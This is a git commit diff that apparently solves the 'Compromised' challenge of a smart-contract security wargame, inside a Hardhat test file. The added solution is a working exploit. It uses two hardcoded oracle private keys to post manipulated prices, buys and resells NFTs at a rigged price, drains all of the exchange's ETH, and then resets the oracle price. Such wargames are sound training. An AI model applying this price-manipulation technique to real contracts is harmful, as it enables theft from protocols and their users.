6d5344562ca6c041ea91a862b3912e8736964d19
HM Ku <hmku@yakoo.com.hk>
2023-12-13 14:19:15 +0800

    complete Challenge 7

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -6,11 +6,7 @@ describe('Compromised challenge', function () {
     let deployer, player;
     let oracle, exchange, nftToken;
 
-    const sources = [
-        '0xA73209FB1a42495120166736362A1DfA9F95A105',
-        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
-        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
-    ];
+    const sources = ['0xA73209FB1a42495120166736362A1DfA9F95A105', '0xe92401A4d3af5E446d93D11EEc806b1462b39D15', '0x81A5D6E50C214044bE44cA0CB057fe119097850c'];
 
     const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
     const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
@@ -20,32 +16,29 @@ describe('Compromised challenge', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
-        
+
         // Initialize balance of the trusted source addresses
         for (let i = 0; i < sources.length; i++) {
             setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
             expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
         }
-        
+
         // Player starts with limited balance
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
+
         // Deploy the oracle and setup the trusted sources with initial prices
         const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
-        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
-            await (await TrustfulOracleInitializerFactory.deploy(
-                sources,
-                ['DVNFT', 'DVNFT', 'DVNFT'],
-                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
-            )).oracle()
+        oracle = await (
+            await ethers.getContractFactory('TrustfulOracle', deployer)
+        ).attach(
+            await (
+                await TrustfulOracleInitializerFactory.deploy(sources, ['DVNFT', 'DVNFT', 'DVNFT'], [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE])
+            ).oracle()
         );
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
-            oracle.address,
-            { value: EXCHANGE_INITIAL_ETH_BALANCE }
-        );
+        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(oracle.address, { value: EXCHANGE_INITIAL_ETH_BALANCE });
         nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
         expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
         expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
@@ -53,29 +46,50 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let walletA = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', ethers.provider);
+        let walletB = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', ethers.provider);
+        console.log(walletA.address, walletB.address);
+
+        // update the price
+        await oracle.connect(walletA).postPrice('DVNFT', 0);
+        await oracle.connect(walletB).postPrice('DVNFT', 1);
+        const price = await oracle.getMedianPrice('DVNFT');
+        const balance = await ethers.provider.getBalance(exchange.address);
+        await exchange.connect(player).buyOne({ value: price });
+        console.log({ price, balance });
+
+        // sell at max
+        await oracle.connect(walletB).postPrice('DVNFT', balance);
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
+        console.log(await oracle.getMedianPrice('DVNFT'));
+        console.log(await ethers.provider.getBalance(exchange.address));
+        // remove what is left
+        await oracle.connect(walletB).postPrice('DVNFT', 1);
+        await exchange.connect(player).buyOne({ value: 1 });
+        await oracle.connect(walletB).postPrice('DVNFT', 2);
+        await nftToken.connect(player).approve(exchange.address, 1);
+        await exchange.connect(player).sellOne(1);
+        console.log(await ethers.provider.getBalance(exchange.address));
+        console.log(await ethers.provider.getBalance(player.address));
+
+        await oracle.connect(walletA).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(walletB).postPrice('DVNFT', INITIAL_NFT_PRICE);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        
+
         // Exchange must have lost all ETH
-        expect(
-            await ethers.provider.getBalance(exchange.address)
-        ).to.be.eq(0);
-        
+        expect(await ethers.provider.getBalance(exchange.address)).to.be.eq(0);
+
         // Player's ETH balance must have significantly increased
-        expect(
-            await ethers.provider.getBalance(player.address)
-        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+        expect(await ethers.provider.getBalance(player.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
+
         // Player must not own any NFT
-        expect(
-            await nftToken.balanceOf(player.address)
-        ).to.be.eq(0);
+        expect(await nftToken.balanceOf(player.address)).to.be.eq(0);
 
         // NFT price shouldn't have changed
-        expect(
-            await oracle.getMedianPrice('DVNFT')
-        ).to.eq(INITIAL_NFT_PRICE);
+        expect(await oracle.getMedianPrice('DVNFT')).to.eq(INITIAL_NFT_PRICE);
     });
 });
